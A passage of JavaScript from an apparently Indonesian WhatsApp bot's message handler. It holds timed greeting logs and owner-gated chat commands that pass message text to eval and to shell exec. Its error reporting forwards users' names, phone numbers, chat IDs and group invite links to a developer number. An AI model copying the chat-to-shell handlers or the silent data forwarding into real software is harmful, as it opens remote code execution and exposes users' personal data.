//setReply(`Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak`)
}
if (timeWib == "05:00:00") {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mBOT\x1b[1;37m]"), color("Udah sholat Subuh belum kak", "deeppink"))
//setReply(`Udah sholat Subuh belum kak`)
}
if (timeWib == "06:00:00") {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mBOT\x1b[1;37m]"), color("Pagi kak, Jangan lupa mandi", "deeppink"))
//setReply(`Pagi kak, Jangan lupa mandi`)
}
if (timeWib == "11:00:00") {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mBOT\x1b[1;37m]"), color("Siang kak, Dah mandi blm kak?", "deeppink"))
//setReply(`Siang kak, Dah mandi blm kak?`)
}
if (timeWib == "12:00:00") {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mBOT\x1b[1;37m]"), color("Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak", "deeppink"))
//setReply(`Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak`)
}
if (timeWib == "15:00:00") {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mBOT\x1b[1;37m]"), color("Dah jam 3 kak, Jangan lupa sholat Ashar ya kak", "deeppink"))
//setReply(`Dah jam 3 kak, Jangan lupa sholat Ashar ya kak`)
}
if (timeWib == "18:00:00") {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mBOT\x1b[1;37m]"), color("Udah mahgrip nih kak, jangan lupa sholat ya", "deeppink"))
//setReply(`Udah mahgrip nih kak, jangan lupa sholat ya`)
}
if (timeWib == "19:00:00") {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mBOT\x1b[1;37m]"), color("Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi", "deeppink"))
//setReply(`Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi`)
}
if (timeWib == "20:00:00") {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mBOT\x1b[1;37m]"), color("Selamat malam kak, Jangan begadang ya kak, Tar sakit loh", "deeppink"))
//setReply(`Selamat malam kak, Jangan begadang ya kak, Tar sakit loh`)
}
if (timeWib == "00:00:00") {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mBOT\x1b[1;37m]"), color("ngantuk kak, tidur dulu ya kak", "deeppink"))
//setReply(`ngantuk kak, tidur dulu ya kak`)
}
//=========================[ EVAL BOT ]=========================\\
if (budy.startsWith("=>")) {
if (!isOwner && !m.key.fromMe) return onlyOwner()
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try{
m.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith(">")) {
if (!isOwner && !m.key.fromMe) return onlyOwner()
try{
let evaled = await eval(budy.slice(2))
if (typeof evaled !== "string") evaled = require("util").inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}

if (budy.startsWith("<")) {
if (!isOwner) return 
try{
return m.reply(JSON.stringify(eval(`${args.join(" ")}`),null,"\t"))
} catch (e) {
m.reply(e)
}
}

if (budy.startsWith("$")){
if (!isOwner && !m.key.fromMe) return onlyOwner()
exec(text, (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) {
m.reply(stdout)
}
})
}
//=========================[ DETECT ERROR ]=========================\\
} catch (err){
if (isCmd) sock.Failed(command, dash)
let e = util.format(err)
await setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n${copyrightnya}`) 
if (sock.checkErrorData(err.message, listerror)) return
sock.addError(command, err.message, listerror)
if (db.data.settings[botNumber].autoblockcmd){        
sock.addDataId("blockcmd", command, dataId)
await setReply("Command telah di block karena terjadi error")
}   
if (db.data.settings[botNumber].autoreport){
if (isQuotedImage){
var media =  "Reply Image ✅"
} else if (isQuotedVideo){
var media = "Reply Video ✅"
} else if (isQuotedSticker){ 
var media = "Reply Sticker ✅"
} else if (isQuotedAudio){
var media = "Reply Audio ✅"
} else if (isQuotedTeks){
var media =  "Reply Teks ✅"
} else if (isQuotedTag){
var media =  "Reply Tag ✅"
} else {
var media = "No Quoted ❌"
}
if (text.length > "0"){
var tetek = q
} else if(text.length == "0"){
var tetek = "No Query ❌"
}
if (m.isGroup && isBotGroupAdmins) {
let linkgc = await sock.groupInviteCode(m.chat)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if (m.isGroup && !isBotGroupAdmins) {
var yeh = `Botz Is Not Admin`
} else if (!m.isGroup) {
var yeh = `Botz Is Not In The Group`
} 

let teks =`\n*]───── 「 Laporan Bug ⚠️」 ─────[*

👤 Nama : ${m.pushName}
📳 Nomer : wa.me/${m.sender.split("@")[0]}
📢 Info Laporan : ${e}
🔖 Command : ${prefix + command}
⏰Time : ${timeWib} Wib
📝 Query : ${tetek}
🧩 Quoted : ${media}
💠 Group : ${m.isGroup?`${groupName}`: "Di private chat"}
🆔 ID : ${m.chat}
🌐 Link Group : ${yeh}\n\n\n`
let mok = [
{"buttonId": `${prefix}banuser ${m.sender.split("@")[0]}`,"buttonText": {"displayText": `ʙᴀɴɴᴇᴅ`},"type": "RESPONSE"},
{"buttonId": `${prefix}thanksuser ${m.sender}`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}]
let tolol = {
text: teks,
footer: `${copyrightnya}`,
buttons: mok,
headerType: 1
}
await sock.sendMessage(devoloper, tolol, { quoted: fkontak})
if (isQuotedSticker) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendMedia(devoloper, media, m, { caption: "System Error"})
} else if (isQuotedImage) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendMedia(devoloper, media, m, { caption: "System Error"})
} else if (isQuotedVideo) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendMedia(devoloper, media, m, { caption: "System Error"})
} else if (isQuotedAudio) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
await sock.sendMedia(devoloper, media, m, { caption: "System Error"})
}
} 
}
} catch (err){
console.log(chalk.bgRed(color("[  ERROR  ]", "black")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if (!db.data.settings[botNumber].publik) return
db.data.settings[botNumber].publik = false
await sock.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Terjadi rate-overlimit
Bot telah mengganti dari mode Public ke mode Self
Untuk menghindari spam yang berlebihan,
Silakan tunggu 1 menit hingga semua pesan
telah terbaca oleh bot`
})
await setTimeout(() => {
db.data.settings[botNumber].publik = true
sock.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes("Connection Closed")){ return }
if (e.includes("Timed Out")){ return }
if (e.includes("Value not found")){ return }
console.log(color("Message Error : %s", "white"), color(util.format(e), "green"))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})
